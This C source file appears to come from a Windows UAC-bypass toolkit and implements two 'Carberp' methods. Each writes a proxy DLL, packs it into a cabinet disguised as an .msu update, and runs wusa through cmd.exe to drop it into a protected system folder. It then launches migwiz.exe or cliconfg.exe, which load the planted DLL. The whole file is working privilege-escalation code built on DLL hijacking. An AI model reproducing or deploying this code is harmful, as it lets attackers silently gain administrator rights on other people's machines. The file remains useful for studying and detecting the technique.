/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2016
*
*  TITLE:       CARBERP.C
*
*  VERSION:     2.50
*
*  DATE:        06 July 2016
*
*  Tweaked Carberp methods.
*  Original Carberp is exploiting mcx2prov.exe in ehome.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "makecab.h"

/*
* ucmWusaExtractPackage
*
* Purpose:
*
* Extract cab to protected directory using wusa.
*
*/
BOOL ucmWusaExtractPackage(
    LPWSTR lpCommandLine
    )
{
    BOOL bResult = FALSE;
    WCHAR szMsuFileName[MAX_PATH * 2];
    WCHAR szCmd[MAX_PATH * 4];

    RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
    _strcpy(szMsuFileName, g_ctx.szTempDirectory);
    _strcat(szMsuFileName, ELLOCNAK_MSU);

    //extract msu data to target directory
    RtlSecureZeroMemory(szCmd, sizeof(szCmd));
    wsprintfW(szCmd, lpCommandLine, szMsuFileName);
    bResult = supRunProcess(L"cmd.exe", szCmd);

    if (szMsuFileName[0] != 0) {
        DeleteFileW(szMsuFileName);
    }
    return bResult;
}

/*
* ucmWusaMethod
*
* Purpose:
*
* Build and install fake msu package then run target application.
*
*/
BOOL ucmWusaMethod(
    UACBYPASSMETHOD Method,
    PVOID ProxyDll,
    DWORD ProxyDllSize
    )
{
    BOOL   bResult = FALSE, cond = FALSE;
    LPWSTR lpCommandLine;
    WCHAR  szSourceDll[MAX_PATH * 2];
    WCHAR  szTargetProcess[MAX_PATH * 2];

    if ((ProxyDll == NULL) || (ProxyDllSize == 0)) {
        return FALSE;
    }

    _strcpy(szTargetProcess, g_ctx.szSystemDirectory);
    _strcpy(szSourceDll, g_ctx.szTempDirectory);

    switch (Method) {

        //use migwiz.exe as target
    case UacMethodCarberp1:
        _strcat(szSourceDll, WDSCORE_DLL);
        lpCommandLine = CMD_EXTRACT_MIGWIZ;
        _strcat(szTargetProcess, MIGWIZ_DIR);
        _strcat(szTargetProcess, MIGWIZ_EXE);
        break;

        //use cliconfg.exe as target
    case UacMethodCarberp2:
        _strcat(szSourceDll, NTWDBLIB_DLL);
        lpCommandLine = CMD_EXTRACT_SYSTEM32;
        _strcat(szTargetProcess, CLICONFG_EXE);
        break;

    default:
        return FALSE;
    }

    if (!PathFileExists(szTargetProcess)) {
        OutputDebugString(T_TARGETNOTFOUND);
        return FALSE;
    }

    do {

        //
        // Extract file to the protected directory
        // First, create cab with fake msu ext, second run fusion process.
        //
        if (!ucmCreateCabinetForSingleFile(szSourceDll, ProxyDll, ProxyDllSize)) {
            break;
        }

        if (!ucmWusaExtractPackage(lpCommandLine)) {
            break;
        }

        //run target process for dll hijacking
        bResult = supRunProcess(szTargetProcess, NULL);

    } while (cond);


    return bResult;
}

/*
* ucmCreateCabinetForSingleFile
*
* Purpose:
*
* Build cabinet for usage in methods where required 1 file.
*
*/
BOOL ucmCreateCabinetForSingleFile(
    LPWSTR lpSourceDll,
    PVOID ProxyDll,
    DWORD ProxyDllSize
    )
{
    BOOL     cond = FALSE, bResult = FALSE;
    CABDATA *Cabinet = NULL;
    LPWSTR   lpFileName;
    WCHAR    szMsuFileName[MAX_PATH * 2];

    if ((ProxyDll == NULL) || (ProxyDllSize == 0)) {
        return FALSE;
    }

    do {

        //drop proxy dll
        if (!supWriteBufferToFile(lpSourceDll, ProxyDll, ProxyDllSize)) {
            break;
        }

        //build cabinet
        RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
        _strcpy(szMsuFileName, g_ctx.szTempDirectory);
        _strcat(szMsuFileName, ELLOCNAK_MSU);

        Cabinet = cabCreate(szMsuFileName);
        if (Cabinet == NULL)
            break;

        lpFileName = _filename(lpSourceDll);
        //put file without compression
        bResult = cabAddFile(Cabinet, lpSourceDll, lpFileName);
        cabClose(Cabinet);

    } while (cond);

    return bResult;
}
